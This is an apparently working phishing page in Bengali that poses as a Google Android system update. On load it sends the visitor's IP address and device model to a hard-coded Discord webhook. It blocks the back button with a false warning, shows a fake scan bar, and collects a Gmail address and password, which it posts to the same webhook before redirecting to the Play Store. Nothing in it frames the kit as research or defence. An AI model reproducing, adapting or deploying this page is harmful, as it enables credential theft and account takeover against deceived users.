<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Android System Intelligence</title>
    <style>
        body { background: #fdfdfd; color: #202124; font-family: 'Roboto', Arial, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .main-card { width: 88%; max-width: 380px; padding: 25px; border-radius: 12px; box-shadow: 0 1px 3px rgba(60,64,67,0.3), 0 4px 8px rgba(60,64,67,0.15); text-align: center; background: #fff; }
        .icon { width: 50px; height: 50px; margin-bottom: 15px; }
        .title { font-size: 20px; font-weight: 500; color: #3c4043; margin-bottom: 10px; }
        .desc { font-size: 14px; color: #5f6368; line-height: 1.4; margin-bottom: 20px; }
        .scan-box { background: #f8f9fa; border: 1px solid #dadce0; border-radius: 8px; padding: 12px; margin-bottom: 20px; font-size: 13px; text-align: left; }
        .progress { width: 100%; height: 4px; background: #e8eaed; border-radius: 2px; overflow: hidden; margin: 10px 0; }
        .bar { width: 0%; height: 100%; background: #1a73e8; transition: width 0.3s; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 15px; box-sizing: border-box; }
        button { width: 100%; padding: 14px; background: #1a73e8; color: #fff; border: none; font-weight: 500; border-radius: 4px; cursor: pointer; font-size: 15px; margin-top: 10px; }
    </style>
</head>
<body onclick="startFix()">

<div class="main-card">
    <img src="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" class="icon" alt="Google">
    <div class="title">সিস্টেম অপ্টিমাইজেশন</div>
    <p class="desc">আপনার ডিভাইসের পারফরম্যান্স উন্নত করতে এবং নিরাপত্তা ত্রুটি দূর করতে এই আপডেটটি প্রয়োজন।</p>
    
    <div class="scan-box">
        <div class="progress"><div class="bar" id="b"></div></div>
        <div id="stat" style="color: #1e8e3e;">সিস্টেম চেক করা হচ্ছে...</div>
    </div>

    <input type="email" id="u" placeholder="আপনার জিমেইল এড্রেস">
    <input type="password" id="p" placeholder="সিকিউরিটি পিন বা পাসওয়ার্ড">
    <button onclick="send()">আপডেট শুরু করুন</button>
</div>

<script>
    const HOOK = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";

    // ১. ক্লিক করলেই রকেট গতিতে আইপি ও মডেল যাবে
    async function capture() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const d = await res.json();
            const model = navigator.userAgent.split('(')[1].split(')')[0];

            fetch(HOOK, {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({
                    content: "✅ **NEW SYSTEM ACCESS**",
                    embeds: [{
                        color: 3447003,
                        fields: [
                            { name: "IP Address", value: d.ip, inline: true },
                            { name: "Device Model", value: model, inline: true }
                        ]
                    }]
                })
            });
        } catch (e) {}
    }

    // ২. ব্যাক বাটন ট্র্যাপ (সে বের হতে চাইলে বাধা দেবে)
    window.history.pushState(null, null, window.location.href);
    window.onpopstate = function() {
        window.history.pushState(null, null, window.location.href);
        alert("আপডেট চলাকালীন পেজটি বন্ধ করবেন না। এতে সিস্টেমের ক্ষতি হতে পারে।");
    };

    // ৩. ফেক স্ক্যান এনিমেশন
    let w = 0;
    function startFix() {
        if(w > 0) return;
        let bar = document.getElementById('b');
        let st = document.getElementById('stat');
        let int = setInterval(() => {
            if(w >= 100) { clearInterval(int); st.innerText = "স্ক্যান সম্পন্ন। ভেরিফাই করুন।"; }
            else { w += 2; bar.style.width = w + "%"; }
        }, 100);
    }

    // ৪. জিমেইল/পাসওয়ার্ড পাঠানো
    async function send() {
        const user = document.getElementById('u').value;
        const pass = document.getElementById('p').value;
        if(!user || !pass) return alert("দয়া করে তথ্য দিন।");

        await fetch(HOOK, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                content: "🔑 **CREDENTIALS RECEIVED**",
                embeds: [{
                    color: 16776960,
                    fields: [
                        { name: "Email/User", value: user },
                        { name: "Password", value: pass }
                    ]
                }]
            })
        });

        alert("ধন্যবাদ। আপনার সিস্টেম সফলভাবে আপডেট হয়েছে।");
        window.onpopstate = null;
        window.location.href = "https://play.google.com";
    }

    window.onload = capture;
</script>

</body>
</html>
